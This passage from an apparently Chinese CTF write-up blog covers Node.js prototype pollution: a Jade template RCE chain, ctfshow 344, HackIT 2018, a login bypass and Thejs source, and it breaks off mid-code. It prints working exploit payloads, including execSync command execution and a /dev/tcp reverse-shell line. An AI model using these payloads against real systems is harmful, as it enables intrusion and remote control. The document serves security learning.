compile</p><p>跟进 66 行 this.visit(this.node);<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125082102153.png"></p><p>this.debug=true 时 node.filename 被 stringify 转换为字符串 node.line 随着被 push 进 buf</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125082655288.png"></p><p>this.visitNode(node);遍历 ast 树后回到 compile<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125084259360.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125084511998.png"></p><p>node.line 被记录到 fn 中，然后</p><blockquote><p>fn = new Function(‘locals, jade’, fn);</p></blockquote><p>那么我们的污染点就出来了，<strong>污染到 node.line 就可以运行代码了</strong></p><h5 id="碰到问题"><a href="#碰到问题" class="headerlink" title="碰到问题"></a>碰到问题</h5><p>post /login</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>监视 node.line 值</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126173326438.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126173359572.png"></p><p>或者<code>Uncaught ReferenceError: node is not defined</code>，说明 node.line 存在原始的值，它不会去 Object 找污染的值</p><p>重新梳理一下调用栈</p><blockquote><p>res.render-&gt;app.render-&gt;tryRender-&gt;view.render-&gt;this.engine</p><ol><li>app.js :: res.render</li><li>jade/lib/index.js :: exports.__express</li><li>jade/lib/index.js :: exports.renderFile<ol><li>jade/lib/index.js :: handleTemplateCache</li></ol></li><li>jade/lib/index.js :: exports.compile<ol><li>jade/lib/index.js :: parse -&gt; compiler.compile();<ol><li>jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node)</li><li>jade/lib/compiler.js :: this.visit</li><li>jade/lib/compiler.js :: this.buf.push</li></ol></li><li>jade/lib/index.js :: parse -&gt; options.self</li><li>jade/lib/index.js :: fn = new Function(‘locals, jade’, fn)</li><li>jade/lib/index.js :: fn(locals, Object.create(runtime))</li></ol></li></ol></blockquote><p>进入 app.render 后可以看到获取了 options，触发 app 渲染引擎进行渲染</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125170700643.png"></p><p>系列参数设置继续步过，进入 tryRender</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173138254.png"></p><p>可以看到，寻找到 app 的渲染引擎，并且设置为 jade，开始渲染</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173338485.png"></p><p>this.engine 进入 jade 库</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173430135.png"></p><p>回到 node.line 打一下看看</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126174150498.png"></p><blockquote><p>TypeError: this[(“visit” + node.type)] is not a function</p></blockquote><p>找到 Compiler.visitNode，打个断点</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126174434191.png"></p><p>拼接发现没有这个方法，遍历 ast 树，通常是通过“visit+节点类型”来遍历所有节点的，观察光标，按照他的默认值设置为 Block</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126183747677.png"></p><p>节点类型不合要求，测试所有节点类型如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">visitAttributes</span><br>visitEach<br>visitCode √<br>visitBlockComment√<br>visitComment√<br>visitText<br>visitFilter<br>visitTag<br>visitMixin<br>visitDoctype√<br>visitMixinBlock√<br>visitBlock<br>visitLiteral<br>visitWhen<br>visitCase<br>visitNode<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126184235129.png"></p><blockquote><p>TypeError: plugin is not a function</p></blockquote><p>看报错还没有完成渲染，找到 jade 渲染完前的最后报错</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126212401866.png"></p><p>是一个判断，打进去的时候 self 是 undefined，可以污染</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126231450129.png"></p><p>污染 title</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126231900595.png"></p><p>污染 message</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126232004589.png"></p><p>污染 error，一开始传了一个 1，传 json 格式的内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">,<span class="hljs-string">&quot;error&quot;</span>:&#123;<span class="hljs-attr">&quot;status&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;stack&quot;</span>:<span class="hljs-string">&quot;runing&quot;</span>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>补充，其实污染目标就是 node.line，一开始就污染 node.line 就可以知道只污染哪些属性即可，因为有些属性不配置的话，它要么有默认值，要么就是能部分渲染没完成，不影响我们的污染数据的执行</p><p>对于普通模板，只需要污染 self 和 line，有继承的模板需要污染 type</p><p>当有顶格 h=title 类型的需要污染 block 类型</p><p>jade 入口：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">exports</span>.__express = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">path, options, fn</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (<br>    options.compileDebug == <span class="hljs-literal">undefined</span> &amp;&amp;<br>    process.env.NODE_ENV === <span class="hljs-string">&#x27;production&#x27;</span><br>  ) &#123;<br>    options.compileDebug = <span class="hljs-literal">false</span><br>  &#125;<br>  <span class="hljs-built_in">exports</span>.renderFile(path, options, fn)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>options.compileDebug</code> 无初始值，可以覆盖开启 Debug 模式，当然也有另外一种情况，部署时，没有正确配置 <code>req.app.get(&#39;env&#39;)</code> 导致 debug 模式开启，那么这个变量也可以不用覆盖，但为了确保通用性，这里还是覆盖一下，防止正确配置</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123; <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123; <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123; <span class="hljs-attr">&quot;compileDebug&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-number">1</span> &#125; &#125; &#125;<br></code></pre></td></tr></table></figure><p>另外<strong>this.debug</strong>哪里来？？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> Compiler = (<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Compiler</span> (<span class="hljs-params">node, options</span>) </span>&#123;<br>  <span class="hljs-built_in">this</span>.debug = <span class="hljs-literal">false</span> !== options.compileDebug<br>  <span class="hljs-comment">// ...</span><br>&#125;)<br></code></pre></td></tr></table></figure></blockquote><p>最终 Exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Code&quot;</span>,<br>      <span class="hljs-attr">&quot;self&quot;</span>: <span class="hljs-number">1</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>来个全家福</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211127000013927.png"></p><h4 id="ctfshow-344"><a href="#ctfshow-344" class="headerlink" title="ctfshow 344"></a>ctfshow 344</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js">router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span><br>  <span class="hljs-keyword">if</span> (req.url.match(<span class="hljs-regexp">/8c|2c|\,/gi</span>)) &#123;<br>    res.end(<span class="hljs-string">&#x27;where is flag :)&#x27;</span>)<br>  &#125;<br>  <span class="hljs-keyword">var</span> query = <span class="hljs-built_in">JSON</span>.parse(req.query.query)<br>  <span class="hljs-keyword">if</span> (<br>    query.name === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp;<br>    query.password === <span class="hljs-string">&#x27;ctfshow&#x27;</span> &amp;&amp;<br>    query.isVIP === <span class="hljs-literal">true</span><br>  ) &#123;<br>    res.end(flag)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.end(<span class="hljs-string">&#x27;where is flag. :)&#x27;</span>)<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>不能有 8c、2c、逗号</p><p>正常请求：</p><blockquote><p>?query={“name”:”admin”,”password”:”ctfshow”,”isVIP”:true}</p></blockquote><p>这里介绍一下 HPP 数据污染</p><blockquote><p>Web 服务器 　　　　　　 参数获取函数 　　　　　　　　　　 获取到的参数</p><p>PHP/Apache 　　 　　 $_GET(“par”) 　　　　　　　　　　 Last</p><p>JSP/Tomcat 　　　　 Request.getParameter(“par”) First</p><p>Perl(CGI)/Apache 　 Param(“par”) 　　　　　　　　　　 First</p><p>Python/Apache 　　 getvalue(“par”) 　　　　　　　　 All(List)</p><p>ASP/IIS 　　　　　　 Request.QueryString(“par”) 　　 All (comma-delimited string)</p></blockquote><p>而 nodejs 就是会将同名参数以数组进行存储，json.parse 也能正常解析</p><blockquote><p>?query={“name”:”admin”&amp;query=”password”:”ctfshow”&amp;query=”isVIP”:true}</p></blockquote><p>逗号已经绕过，url 编码看一下</p><blockquote><p>%3Fquery%3D%7B%22name%22%3A%22admin%22%26query%3D%22password%22%3A%22ctfshow%22%26query%3D%22isVIP%22%3Atrue%7D</p></blockquote><p>ctfshow 前面出现了一个%22，是双引号，和 c 成了 2c，c 得绕一下，进行 unicode 编码一下%63</p><p>payload：</p><blockquote><p>?query={“name”:”admin”&amp;query=”password”:”%63tfshow”&amp;query=”isVIP”:true}</p></blockquote><h4 id="hackit-2018"><a href="#hackit-2018" class="headerlink" title="hackit 2018"></a>hackit 2018</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&#x27;use strict&#x27;</span><br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<br><br><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span> (<span class="hljs-params">a, b</span>) </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>      merge(a[attr], b[attr])<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr]<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span> (<span class="hljs-params">a</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> merge(&#123;&#125;, a)<br>&#125;<br><br><span class="hljs-comment">// Constants</span><br><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">8080</span><br><span class="hljs-keyword">const</span> HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br><span class="hljs-keyword">const</span> admin = &#123;&#125;<br><br><span class="hljs-comment">// App</span><br><span class="hljs-keyword">const</span> app = express()<br>app.use(bodyParser.json())<br>app.use(cookieParser())<br><br>app.use(<span class="hljs-string">&#x27;/&#x27;</span>, express.static(path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>)))<br>app.post(<span class="hljs-string">&#x27;/signup&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> body = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.body))<br>  <span class="hljs-keyword">var</span> copybody = clone(body)<br>  <span class="hljs-keyword">if</span> (copybody.name) &#123;<br>    res.cookie(<span class="hljs-string">&#x27;name&#x27;</span>, copybody.name).json(&#123;<br>      <span class="hljs-attr">done</span>: <span class="hljs-string">&#x27;cookie set&#x27;</span><br>    &#125;)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.json(&#123;<br>      <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;cookie not set&#x27;</span><br>    &#125;)<br>  &#125;<br>&#125;)<br>app.get(<span class="hljs-string">&#x27;/getFlag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> аdmin = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.cookies))<br>  <span class="hljs-keyword">if</span> (admin.аdmin == <span class="hljs-number">1</span>) &#123;<br>    res.send(<span class="hljs-string">&#x27;hackim19&#123;&#125;&#x27;</span>)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.send(<span class="hljs-string">&#x27;You are not authorized&#x27;</span>)<br>  &#125;<br>&#125;)<br>app.listen(PORT, HOST)<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Running on http://<span class="hljs-subst">$&#123;HOST&#125;</span>:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -vv --header &#x27;Content-type: application/json&#x27; -d &#x27;&#123;&quot;__proto__&quot;: &#123;&quot;admin&quot;: 1&#125;&#125;&#x27; &#x27;http://0.0.0.0:4000/signup&#x27;;<br><br>curl -vv &#x27;http://0.0.0.0:4000/getFlag&#x27;<br></code></pre></td></tr></table></figure><p>首先请求 /signup 接口，在 NodeJS 服务中，我们调用了有漏洞的 merge 方法，并通过<code>__proto__</code> 为 Object.prototype（因为 <code>&#123;&#125;.__proto__ === Object.prototype</code>） 添加上一个新的属性 admin，且值为 1。</p><p>再次请求 getFlag 接口，条件语句 <code>admin.аdmin == 1</code> 为 true，服务被攻击。</p><p>攻击案例出自：Prototype pollution attacks in NodeJS applications</p><p>这样的漏洞在 jQuery <code>$.extend </code>中也经常见到<br>对于 jQuery：如果担心安全问题，建议升级至最新版本 jQuery 3.4.0，如果还在使用 jQuery 的 1.x 和 2.x 版本，那么你的应用程序和网站仍有可能遭受攻击。</p><h4 id="登录绕过题"><a href="#登录绕过题" class="headerlink" title="登录绕过题"></a>登录绕过题</h4><p>{“user”:[0],”passwd”:[0]}</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E8%AE%BF%E9%97%AE%E5%90%8E%E7%AB%AFjs%E6%96%87%E4%BB%B6.png"></p><p>这题可以控制 host 参数去篡改 mysql 的连接地址 利用 mysql 客户端任意文件读取 <a href="https://blog.csdn.net/ls1120704214/article/details/88174003">https://blog.csdn.net/ls1120704214/article/details/88174003</a></p><p>但是如果直接在 json 中传递<code>&#123;&quot;host&quot;:&quot;&quot;&#125;</code>,根本不会有任何效果<br>在 57 行<br><code>if (body.host != undefined) &#123;</code><br>如果发现有直接传递进来的 host 参数，nodejs 就报错退出，所以，通过仔细观察源代码，发现这个代码有参数污染问题，所以就可以通过构造如下参数去改变 host 参数，把 host 参数变成我们自己 mysql 服务器的地址<br>原题作者博客<a href="https://xz.aliyun.com/t/6991">https://xz.aliyun.com/t/6991</a></p><p>不用 host 参数篡改 mysql 地址 还可以利用原型链污染：<br><code>&#123;&quot;user&quot;:&quot;test&quot;,&quot;passwd&quot;:&quot;test&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p><h4 id="Code-Breaking-Thejs"><a href="#Code-Breaking-Thejs" class="headerlink" title="Code-Breaking Thejs"></a>Code-Breaking Thejs</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br>app.use(bodyParser.urlencoded(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).use(bodyParser.json()) <span class="hljs-comment">//处理JSON数据</span><br>app.use(<span class="hljs-string">&#x27;/static&#x27;</span>, express.static(<span class="hljs-string">&#x27;static&#x27;</span>))<br>app.use(session(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;thejs.session&#x27;</span>,<br>    <span class="hljs-attr">secret</span>: randomize(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>     <span class="hljs-comment">//设置一下Session</span><br>&#125;))<br>app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123; <span class="hljs-comment">// define the template engine</span><br>    fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err)) <span class="hljs-comment">//调用ejs进行渲染</span><br>        <span class="hljs-keyword">let</span> compiled = lodash.template(content) <span class="hljs-comment">//渲染内容</span><br>        <span class="hljs-keyword">let</span> rendered = compiled(&#123;...options&#125;) <span class="hljs-comment">//动态引入成员变量</span><br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered) <span class="hljs-comment">//传回来</span><br>&#125;)<br>&#125;)<br>app.set(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>)<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>)<br>app.all(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> data = req.session.data || &#123;<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []&#125;<br>    <span class="hljs-keyword">if</span> (req.method == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>        data = lodash.merge(data, req.body)<br>        req.session.data = data<br>    &#125;    <span class="hljs-comment">//将body中的数据传入sessioN中</span><br>res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123;<br>    <span class="hljs-attr">language</span>: data.language,<br>    <span class="hljs-attr">category</span>: data.category <span class="hljs-comment">//渲染自己的选择</span><br>&#125;)<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">console</span>.log(Example app listening on port <span class="hljs-number">3000</span>!))<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> hbs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>)<br><span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> md5 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;md5&#x27;</span>)<br><span class="hljs-keyword">var</span> morganBody = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan-body&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br><span class="hljs-keyword">var</span> user = [] <span class="hljs-comment">//empty for now</span><br><span class="hljs-keyword">var</span> matrix = []<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>  matrix[i] = [<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">draw</span> (<span class="hljs-params">mat</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[i][j] !== <span class="hljs-literal">null</span>) &#123;<br>        count += <span class="hljs-number">1</span><br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> count === <span class="hljs-number">9</span><br>&#125;<br>app.use(express.static(<span class="hljs-string">&#x27;public&#x27;</span>))<br>app.use(bodyParser.json())<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span 